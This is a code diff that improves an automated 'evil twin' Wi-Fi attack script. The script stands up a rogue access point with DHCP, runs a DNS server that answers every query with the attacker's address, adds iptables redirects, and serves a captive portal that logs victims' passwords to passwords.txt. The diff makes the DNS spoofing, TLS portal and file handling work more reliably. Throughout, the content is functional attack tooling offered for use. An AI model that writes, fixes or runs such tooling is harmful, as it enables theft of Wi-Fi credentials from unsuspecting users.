@@ -43,7 +43,8 @@ AP_ROUTER=192.168.3.1
 AP_RANGE_START=192.168.3.20
 AP_RANGE_END=192.168.3.60
 
-DHCPD_FILE="dhcpd.conf"
+DHCPD_CONF="/etc/dhcp/et-auto-dhcpd.conf"
+DHCPD_LEASES="/var/lib/dhcp/dhcpd.leases-et-auto"
 
 ###########################################
 # Get information of the chipset.
@@ -314,8 +315,8 @@ get_interfaces_chipsets() {
 #   None
 ###########################################
 create_dhcpd_config_file() {
-    local file_path="${TMP_DIR}/${DHCPD_FILE}"
-    mkdir -p "${TMP_DIR}"
+    local file_path="${DHCPD_CONF}"
+    mkdir -p "$(dirname "${file_path}")"
     rm -f "${file_path}"
     {
         echo -e "authoritative;"
@@ -654,37 +655,65 @@ import socket, struct, datetime, sys, os
 
 AP_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.3.1"
 LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/dns.log"
-PID_FILE = "/tmp/evil-twin-automated/dns_server.pid"
+PID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_server.pid")
+
+def log(msg):
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write("[%s] %s\n" % (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), msg))
+    except Exception:
+        pass
 
 with open(PID_FILE, "w") as f:
     f.write(str(os.getpid()))
 
-ip_parts = [int(x) for x in AP_IP.split(".")]
-ip_bytes = struct.pack("!BBBB", *ip_parts)
+ip_bytes = socket.inet_aton(AP_IP)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-sock.bind(("0.0.0.0", 53))
+try:
+    sock.bind((AP_IP, 53))
+except OSError as e:
+    log("FATAL: cannot bind %s:53 - %s" % (AP_IP, e))
+    sys.exit(1)
+
+log("listening on %s:53, resolving all domains to %s" % (AP_IP, AP_IP))
+
+def decode_qname(data, pos):
+    labels = []
+    while pos < len(data):
+        ln = data[pos]
+        if ln == 0:
+            return ".".join(labels), pos + 1
+        labels.append(data[pos+1:pos+1+ln].decode("latin-1", errors="replace"))
+        pos += 1 + ln
+    return ".".join(labels), pos
 
 while True:
     data, addr = sock.recvfrom(512)
     if len(data) < 12:
         continue
     tid = data[:2]
-    flags = b"\x81\x80"
     qdcount = struct.unpack("!H", data[4:6])[0]
-    ancount = struct.pack("!H", qdcount)
-    response = tid + flags + struct.pack("!HHHH", qdcount, qdcount, 0, 0)
     pos = 12
+    questions = b""
+    answers = b""
+    ancount = 0
     for _ in range(qdcount):
         end = data.find(b"\x00", pos)
         if end == -1:
             break
         qname = data[pos:end+1]
         qtype = data[end+1:end+3]
+        qclass = data[end+3:end+5]
+        domain, _ = decode_qname(data, pos)
+        log("query %-40s from %s" % (domain, addr[0]))
+        questions += qname + qtype + qclass
+        if qtype == b"\x00\x01":
+            answers += b"\xc0\x0c" + qtype + qclass + b"\x00\x00\x00\x3c\x00\x04" + ip_bytes
+            ancount += 1
         pos = end + 5
-        response += qname + qtype + b"\x00\x01"
-        response += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + ip_bytes
+    response = tid + b"\x81\x80" + struct.pack("!HHHH", qdcount, ancount, 0, 0) + questions + answers
     sock.sendto(response, addr)
 PYEOF
 
@@ -794,16 +823,22 @@ class Handler(http.server.BaseHTTPRequestHandler):
         self.wfile.write(html.encode("utf-8"))
 
     def log_message(self, format, *args):
-        pass
+        sys.stderr.write("%s - %s\n" % (self.address_string(), format % args))
+        sys.stderr.flush()
 
 def run_server(port, use_ssl=False):
-    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
-    if use_ssl:
-        server.socket = ssl.wrap_socket(server.socket, certfile=CERT_FILE, keyfile=KEY_FILE, server_side=True)
     try:
+        server = http.server.HTTPServer(("0.0.0.0", port), Handler)
+        if use_ssl:
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ctx.load_cert_chain(CERT_FILE, KEY_FILE)
+            server.socket = ctx.wrap_socket(server.socket, server_side=True)
+        sys.stderr.write("listening on port %d (%s)\n" % (port, "https" if use_ssl else "http"))
+        sys.stderr.flush()
         server.serve_forever()
-    except OSError:
-        pass
+    except Exception as e:
+        sys.stderr.write("FATAL: port %d - %s\n" % (port, e))
+        sys.stderr.flush()
 
 t1 = threading.Thread(target=run_server, args=(HTTP_PORT, False), daemon=True)
 t1.start()
@@ -836,6 +871,7 @@ cleanup() {
     iptables -D FORWARD -i at0 -o "${lan}" -j ACCEPT 2>/dev/null || true
     iptables -D FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
     iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
+    rm -f "${DHCPD_CONF}" "${DHCPD_LEASES}" 2>/dev/null || true
     rm -rf "${TMP_DIR}" 2>/dev/null || true
     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Done.${WHITE}"
 }
@@ -948,8 +984,8 @@ main() {
                     fi
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
-                    touch "${TMP_DIR}/dhcpd.leases"
-                    run_background "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" -lf \"${TMP_DIR}/dhcpd.leases\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
+                    touch "${DHCPD_LEASES}"
+                    run_background "dhcpd -d -cf \"${DHCPD_CONF}\" -lf \"${DHCPD_LEASES}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
 
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
@@ -987,7 +1023,7 @@ main() {
                                     iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 443
                                     iptables -t nat -A PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53
 
-                                    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns.log" "dns_server"
+                                    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log" "dns_server"
                                     run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80" "captive_portal"
 
                                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
